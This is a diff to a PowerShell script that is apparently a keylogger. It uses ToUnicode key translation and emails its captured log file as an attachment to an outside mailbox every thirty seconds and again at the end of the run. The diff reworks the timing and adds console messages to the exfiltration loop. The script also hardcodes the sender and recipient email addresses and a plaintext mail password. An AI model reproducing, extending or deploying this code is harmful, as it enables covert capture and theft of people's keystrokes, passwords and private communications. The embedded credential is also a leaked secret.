@@ -1,4 +1,5 @@
 $MaxRunTimeMinutes = 60    # Tempo máximo de execução em minutos
+$EmailIntervalSeconds = 30  # Intervalo de tempo entre os emails em segundos
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
@@ -41,18 +42,25 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
         }
 
-        # Verifica se é hora de enviar o log
-        $currentTime = Get-Date
-        if ($currentTime.Second % 30 -eq 0) {
-            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
-        }
+        # Calcula o tempo restante até o próximo envio de email
+        $timeUntilNextEmail = $EmailIntervalSeconds - (Get-Date).Second % $EmailIntervalSeconds
 
-        # Aguarda 30 segundos antes de continuar
-        Start-Sleep -Seconds 30
+        # Mostra a contagem regressiva no console
+        Write-Host "Próximo email será enviado em $timeUntilNextEmail segundos..."
+
+        # Aguarda antes de enviar o próximo email
+        Start-Sleep -Seconds $timeUntilNextEmail
+
+        # Envia o email
+        Write-Host "Enviando email..."
+        Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+        Write-Host "Email enviado."
     }
 
     # Após o término do tempo de execução, envia o log final
+    Write-Host "Enviando email final..."
     Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+    Write-Host "Email final enviado."
 }
 
 Start-Helper
